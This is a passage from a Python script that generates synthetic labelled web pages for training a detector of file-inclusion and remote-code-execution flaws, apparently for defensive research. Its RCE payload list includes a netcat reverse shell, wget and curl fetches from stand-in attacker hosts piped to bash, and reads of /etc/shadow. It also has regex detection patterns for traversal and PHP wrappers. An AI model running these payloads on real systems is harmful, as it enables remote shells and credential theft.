                require_once($path);
                readfile($document);
                file_get_contents($source);
            </div>
            <?php
                include($_GET['file']);
                require_once($path);
                readfile($document);
                highlight_file($source);
            ?>
        </body>
        </html>
        """
        
        # Extract features
        soup = BeautifulSoup(html, 'html.parser')
        features = [
            len(html),  # Total HTML length
            len(re.findall(r'<input', html, re.IGNORECASE)),  # Number of input fields
            len(re.findall(r'<form', html, re.IGNORECASE)),  # Number of forms
            len(re.findall(r'javascript:', html, re.IGNORECASE)),  # JavaScript protocol usage
            len(soup.find_all('script')),  # Number of script tags
            len(soup.find_all('iframe')),  # Number of iframes
            len(soup.find_all('a', href=True)),  # Number of links
            len(soup.find_all('meta')),  # Number of meta tags
            len(soup.find_all('link')),  # Number of link tags
            len(re.findall(r'function\s*\(', html)),  # Number of JavaScript functions
            
            # File inclusion patterns
            len(re.findall(r'include\s*\(', html, re.IGNORECASE)),
            len(re.findall(r'require\s*\(', html, re.IGNORECASE)),
            len(re.findall(r'include_once\s*\(', html, re.IGNORECASE)),
            len(re.findall(r'require_once\s*\(', html, re.IGNORECASE)),
            len(re.findall(r'fopen\s*\(', html, re.IGNORECASE)),
            
            # Path traversal
            len(re.findall(r'\.\./', url)),
            len(re.findall(r'\.\.\\', url)),
            len(re.findall(r'%2e%2e%2f', url, re.IGNORECASE)),
            len(re.findall(r'%252e%252e%252f', url, re.IGNORECASE)),
            len(re.findall(r'\.\.%2f', url, re.IGNORECASE)),
            
            # Common targets
            len(re.findall(r'/etc/passwd', html)),
            len(re.findall(r'/etc/shadow', html)),
            len(re.findall(r'/proc/self/environ', html)),
            len(re.findall(r'wp-config\.php', html)),
            len(re.findall(r'config\.php', html)),
            
            # File operations
            len(re.findall(r'readfile\s*\(', html, re.IGNORECASE)),
            len(re.findall(r'file_get_contents\s*\(', html, re.IGNORECASE)),
            len(re.findall(r'show_source\s*\(', html, re.IGNORECASE)),
            len(re.findall(r'highlight_file\s*\(', html, re.IGNORECASE)),
            len(re.findall(r'include\s*\$_[A-Za-z0-9_]+', html)),
            
            # PHP wrappers
            len(re.findall(r'php://filter', html)),
            len(re.findall(r'php://input', html)),
            len(re.findall(r'phar://', html)),
            len(re.findall(r'zip://', html)),
            len(re.findall(r'data://', html))
        ]
        
        samples.append({
            'url': url,
            'html': html,
            'features': features,
            'is_vulnerable': True
        })
    
    # Generate non-vulnerable samples
    for _ in range(num_samples // 2):
        safe_file = f"templates/{generate_random_string()}.html"
        url = f"http://example.com/page.php?file={safe_file}"
        html = f"""
        <html>
        <head>
            <title>File Viewer</title>
            <link rel="stylesheet" href="style.css">
            <meta charset="utf-8">
        </head>
        <body>
            <h1>File Viewer</h1>
            <div class="content">
                <h2>Viewing file: {html_module.escape(safe_file)}</h2>
                <p>File contents would be displayed here.</p>
            </div>
        </body>
        </html>
        """
        
        # Extract features
        soup = BeautifulSoup(html, 'html.parser')
        features = [
            len(html),  # Total HTML length
            len(re.findall(r'<input', html, re.IGNORECASE)),  # Number of input fields
            len(re.findall(r'<form', html, re.IGNORECASE)),  # Number of forms
            len(re.findall(r'javascript:', html, re.IGNORECASE)),  # JavaScript protocol usage
            len(soup.find_all('script')),  # Number of script tags
            len(soup.find_all('iframe')),  # Number of iframes
            len(soup.find_all('a', href=True)),  # Number of links
            len(soup.find_all('meta')),  # Number of meta tags
            len(soup.find_all('link')),  # Number of link tags
            len(re.findall(r'function\s*\(', html)),  # Number of JavaScript functions
            
            # File inclusion patterns (all 0 for non-vulnerable)
            0, 0, 0, 0, 0,
            
            # Path traversal (all 0 for non-vulnerable)
            0, 0, 0, 0, 0,
            
            # Common targets (all 0 for non-vulnerable)
            0, 0, 0, 0, 0,
            
            # File operations (all 0 for non-vulnerable)
            0, 0, 0, 0, 0,
            
            # PHP wrappers (all 0 for non-vulnerable)
            0, 0, 0, 0, 0
        ]
        
        samples.append({
            'url': url,
            'html': html,
            'features': features,
            'is_vulnerable': False
        })
    
    return samples

def generate_rce_samples(num_samples=100):
    """Generate RCE training samples"""
    samples = []
    
    # RCE payloads
    rce_payloads = [
        "system('id');",
        "exec('whoami');",
        "shell_exec('cat /etc/passwd');",
        "passthru('ls -la');",
        "`uname -a`",
        "$(cat /etc/shadow)",
        ";nc -e /bin/sh 10.0.0.1 4444;",
        "|wget http://evil.com/shell.php;",
        "curl http://attacker.com/payload|bash",
        "python -c 'import os;os.system(\"id\")'"
    ]
    
    # Generate vulnerable samples
    for _ in range(num_samples // 2):
        payload = random.choice(rce_payloads)
        url = f"http://example.com/debug.php?cmd={payload}"
        html = f"""
        <html>
        <head>
            <title>Debug Console</title>
            <link rel="stylesheet" href="style.css">
            <meta charset="utf-8">
        </head>
        <body>
            <h1>Debug Console</h1>
            <div class="output">
                Command output:
                <pre>
                <?php
                    system($_GET['cmd']);
                    exec($command);
                    shell_exec($input);
                    passthru($args);
                    echo `{payload}`;
                ?>
                </pre>
            </div>
            <div class="debug">
                Warning: shell_exec() has been disabled for security reasons
                system() command failed: Permission denied
                exec() is restricted in safe_mode
            </div>
        </body>
        </html>
        """
        
        # Extract features
        soup = BeautifulSoup(html, 'html.parser')
        features = [
            len(html),  # Total HTML length
            len(re.findall(r'<input', html, re.IGNORECASE)),  # Number of input fields
            len(re.findall(r'<form', html, re.IGNORECASE)),  # Number of forms
            len(re.findall(r'javascript:', html, re.IGNORECASE)),  # JavaScript protocol usage
            len(soup.find_all('script')),  # Number of script tags
            len(soup.find_all('iframe')),  # Number of iframes
            len(soup.find_all('a', href=True)),  # Number of links
            len(soup.find_all('meta')),  # Number of meta tags
            len(soup.find_all('link')),  # Number of link tags
            len(re.findall(r'function\s*\(', html)),  # Number of JavaScript functions
            
            # Command execution functions
            len(re.findall(r'system\s*\(', html, re.IGNORECASE)),
            len(re.findall(r'exec\s*\(', html, re.IGNORECASE)),
            len(re.findall(r'shell_exec\s*\(', html, re.IGNORECASE)),
            len(re.findall(r'passthru\s*\(', html, re.IGNORECASE)),
            len(re.findall(r'eval\s*\(', html, re.IGNORECASE)),
            
            # Shell commands
            len(re.findall(r'`.*`', html)),
            len(re.findall(r'ps\s+aux', html)),
            len(re.findall(r'kill\s+-9', html)),
            len(re.findall(r'pkill', html)),
            len(re.findall(r'killall', html)),
            len(re.findall(r'nohup', html))
        ]
        samples.append({
            'url': url,
            'html': html,
            'features': features,
            'is_vulnerable': True
        })
    # Generate non-vulnerable samples
    for _ in range(num_samples // 2):
        safe_cmd = generate_random_string()
        url = f"http://example.com/debug.php?cmd={safe_cmd}"
        html = f"""
        <html>
        <head>
            <title>Debug Console</title>
            <link rel=\"stylesheet\" href=\"style.css\">
            <meta charset=\"utf-8\">
        </head>
        <body>
            <h1>Debug Console</h1>
            <div class=\"output\">
                Command not recognized: {html_module.escape(safe_cmd)}
            </div>
            <div class=\"help\">
                Available commands: help, status, version, info
            </div>
        </body>
        </html>
        """
        soup = BeautifulSoup(html, 'html.parser')
        features = [
            len(html),  # Total HTML length
            len(re.findall(r'<input', html, re.IGNORECASE)),  # Number of input fields
            len(re.findall(r'<form', html, re.IGNORECASE)),  # Number of forms
            len(re.findall(r'javascript:', html, re.IGNORECASE)),  # JavaScript protocol usage
            len(soup.find_all('script')),  # Number of script tags
            len(soup.find_all('iframe')),  # Number of iframes
            len(soup.find_all('a', href=True)),  # Number of links
            len(soup.find_all('meta')),  # Number of meta tags
            len(soup.find_all('link')),  # Number of link tags
            len(re.findall(r'function\s*\(', html)),  # Number of JavaScript functions
            # Command execution functions (all 0 for non-vulnerable)
            0, 0, 0, 0, 0,
            # Shell commands (all 0 for non-vulnerable) - 6 features
            0, 0, 0, 0, 0, 0 
        ]
        samples.append({
            'url': url,
            'html': html,
            'features': features,
            'is_vulnerable': False
        })
    return samples

def main():
    # Create training data directory if it doesn't exist
    if not os.path.exists("training_data"):
        os.makedirs("training_data")
    # Generate training data for each vulnerability type
    vulnerability_types = {
        "xss": generate_xss_samples,
        "sqli": generate_sqli_samples,
        "csrf": generate_csrf_samples,
        "ssrf": generate_ssrf_samples,
        "lfi": generate_lfi_samples,
        "rce": generate_rce_samples
    }
    for vuln_type, generator_func in vulnerability_types.items():
        print(f"Generating training data for {vuln_type}...")
        samples = generator_func(num_samples=1000)  # Generate 1000 samples for each type
        # Save to JSON file
        output_file = f"training_data/{vuln_type}_training_data.json"
        with open(output_file, "w") as f:
            json.dump({'samples': samples}, f, indent=4)
        print(f"Saved {len(samples)} samples to {output_file}")
    print("\n[*] Training data generation complete!")
    
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Critical error: {e}")
        if ML_DEBUG:
            print(f"[!] Stack trace: {traceback.format_exc()}")
        sys.exit(1) 